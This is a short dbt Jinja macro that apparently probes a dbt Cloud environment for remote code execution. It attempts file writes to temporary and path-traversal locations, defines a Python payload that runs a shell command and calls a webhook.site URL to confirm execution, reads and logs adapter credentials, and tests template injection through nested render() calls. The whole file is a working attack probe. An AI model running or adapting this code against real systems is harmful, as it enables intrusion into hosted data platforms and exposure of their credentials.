{% macro write_probe() %}
  {{ log("WRITE_START=true", info=True) }}
  
  {# Try writing to various paths #}
  {% set paths = [
    "/tmp/jobs/rce_test.py",
    "/tmp/jobs/malicious.py",
    "/tmp/rce_test.txt",
    "../../rce_test.txt",
    "/tmp/jobs/" ~ env_var('DBT_CLOUD_RUN_ID') ~ "/target/rce_test.py"
  ] %}
  
  {% set py_payload = "import os; os.system('id > /tmp/rce_proof.txt; curl https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72?rce=write_confirmed')" %}
  
  {% for path in paths %}
    {% set result = write(path) %}
    {{ log("WRITE_TO_" ~ loop.index ~ "=" ~ path ~ " RESULT=" ~ result, info=True) }}
  {% endfor %}
  
  {# Check if write writes content or just the path #}
  {{ log("WRITE_SIGNATURE=checking", info=True) }}
  
  {# The write() function in dbt takes a relation and writes to manifest - let's check #}
  {% set creds = adapter.config.credentials %}
  {{ log("CREDS_STILL_ACCESSIBLE=" ~ creds.database, info=True) }}
  
  {# Try render() with different context #}
  {% set rendered = render("{{ 7 * 7 }}") %}
  {{ log("RENDER_TEST=" ~ rendered, info=True) }}
  
  {# Try render with log injection #}
  {% set rendered2 = render("{{ log('RENDERED_INNER=from_render', info=True) }}") %}
  {{ log("RENDER_INNER_DONE=" ~ rendered2, info=True) }}
  
{% endmacro %}
